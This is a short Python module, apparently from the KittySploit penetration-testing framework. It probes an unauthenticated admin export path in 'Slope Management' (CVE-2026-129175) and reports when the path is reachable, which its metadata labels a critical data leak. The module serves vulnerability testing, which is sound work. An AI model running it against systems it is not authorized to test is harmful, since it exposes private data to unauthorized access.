#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-129175 — Slope Management protected path access."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.slope_management import Slope_management


class Module(Auxiliary, Http_client, Slope_management):
    __info__ = {
        "name": "Slope Management CVE-2026-129175 unauth access",
        "description": "Requests admin path without authentication.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-129175"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-129175"],
        "tags": ["slope", "missing-auth", "cve-2026-129175", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["data_leak"],
            "chain": {
                "suggested_followups": ["scanner/http/slope_mgmt_cve_2026_129175_detect"],
            },
        },
    }

    admin_path = OptString("/admin/export", "Path expected to require auth", required=False)

    def run(self):
        path = str(self.admin_path or "/admin/export")
        res = self.slope_unauth_access(path)
        if not res:
            print_error(f"Path {path} not accessible unauthenticated")
            return False
        print_success(f"{path} reachable (HTTP {res['status_code']}, {res['length']} bytes)")
        self.set_info(severity="critical", cve="CVE-2026-129175", **res)
        return True